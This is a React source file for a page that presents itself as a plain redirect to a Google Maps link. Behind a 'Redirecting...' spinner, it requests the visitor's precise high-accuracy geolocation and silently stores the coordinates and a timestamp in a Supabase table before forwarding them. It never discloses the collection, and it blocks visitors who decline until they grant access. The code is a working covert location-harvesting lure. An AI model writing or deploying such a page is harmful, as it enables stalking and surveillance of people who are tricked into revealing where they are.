// src/App.jsx
import { useState, useEffect } from "react";
import { supabase } from "./supabase";
import "./App.css";

function App() {
  const [status, setStatus] = useState("requesting"); // 'requesting', 'denied', 'success'

  useEffect(() => {
    // Check if geolocation is supported
    if (!navigator.geolocation) {
      console.error("Geolocation is not supported by your browser");
      redirectToLocation();
      return;
    }

    // Request location permission immediately
    requestLocation();
  }, []);

  const requestLocation = () => {
    setStatus("requesting");

    // Request precise location with high accuracy
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;

        try {
          // Save location to Supabase
          const { error } = await supabase.from("locations").insert([
            {
              latitude,
              longitude,
              timestamp: new Date().toISOString(),
            },
          ]);

          if (error) {
            console.error("Error saving location:", error);
          }

          setStatus("success");
          // Redirect after successful location access
          redirectToLocation();
        } catch (err) {
          console.error("Error saving location:", err);
          setStatus("success");
          // Redirect anyway even if there was an error saving
          redirectToLocation();
        }
      },
      (err) => {
        console.error("Geolocation error:", err);

        if (err.code === 1) {
          // PERMISSION_DENIED
          setStatus("denied");
          // Don't redirect - we'll show a message asking them to enable location
        } else {
          // For other errors (POSITION_UNAVAILABLE, TIMEOUT), still redirect
          redirectToLocation();
        }
      },
      {
        enableHighAccuracy: true, // Request high accuracy for precise location
        timeout: 10000, // 10 seconds timeout
        maximumAge: 0, // Don't use cached position
      }
    );
  };

  const redirectToLocation = () => {
    // Redirect to the specific location
    const specificLocationUrl = "https://maps.app.goo.gl/TSZQucADCqHnj5odA";
    // Short delay to ensure any UI transitions are complete
    setTimeout(() => {
      window.location.href = specificLocationUrl;
    }, 1500);
  };

  return (
    <div className="loader-container">
      {status === "requesting" || status === "success" ? (
        <>
          <div className="loader"></div>
          <h2 className="redirecting-text">Redirecting...</h2>
        </>
      ) : status === "denied" ? (
        <div className="location-denied">
          <div className="location-icon">📍</div>
          <h2>Location Access Required</h2>
          <p>This site needs your location to continue.</p>
          <p className="instructions">
            Please enable location services in your browser settings and try
            again.
          </p>
          <button className="retry-button" onClick={requestLocation}>
            Enable Location Access
          </button>
        </div>
      ) : null}
    </div>
  );
}

export default App;
